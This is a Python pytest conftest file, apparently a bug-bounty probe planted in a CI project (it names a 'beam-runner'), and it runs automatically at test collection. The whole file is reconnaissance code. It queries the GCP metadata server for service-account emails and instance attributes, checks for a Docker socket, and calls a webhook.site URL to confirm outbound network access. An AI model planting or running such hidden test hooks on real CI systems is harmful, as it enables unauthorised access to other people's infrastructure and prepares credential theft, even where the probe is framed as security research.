# IBB security verification conftest (round 2). Names/booleans/status only.
# Lists service-account EMAILS and attribute NAMES from the GCP metadata service
# (no tokens requested), prints instance descriptors, checks egress with a nonce.
import os

print("BBP2-BEGIN", flush=True)

def meta(path):
    import urllib.request
    req = urllib.request.Request("http://metadata.google.internal/computeMetadata/v1/" + path,
                                 headers={"Metadata-Flavor": "Google"})
    return urllib.request.urlopen(req, timeout=3).read().decode()

try:
    print("BBP2-SA-EMAILS", meta("instance/service-accounts/").replace("\n", ","), flush=True)
except Exception as e:
    print("BBP2-SA-ERR", type(e).__name__, flush=True)
for attr in ["name", "zone", "machine-type", "schedulable", "cpu-platform"]:
    try:
        print(f"BBP2-ATTR-{attr}", meta(f"instance/{attr}").strip(), flush=True)
    except Exception as e:
        print(f"BBP2-ATTR-{attr}-ERR", type(e).__name__, flush=True)
try:
    print("BBP2-ATTR-NAMES", meta("instance/attributes/").replace("\n", ","), flush=True)
except Exception as e:
    print("BBP2-ATTR-NAMES-ERR", type(e).__name__, flush=True)
print("BBP2-DOCKER-SOCK", os.path.exists("/var/run/docker.sock"), flush=True)
print("BBP2-DOCKER-HOST", os.environ.get("DOCKER_HOST", "unset"), flush=True)
try:
    import urllib.request
    req = urllib.request.Request("https://webhook.site/9e0d1460-5301-4bef-9dc9-996f731cbaec?src=beam-runner-egress-nonce")
    print("BBP2-EGRESS-STATUS", urllib.request.urlopen(req, timeout=5).status, flush=True)
except Exception as e:
    print("BBP2-EGRESS-ERR", type(e).__name__, flush=True)
print("BBP2-END", flush=True)
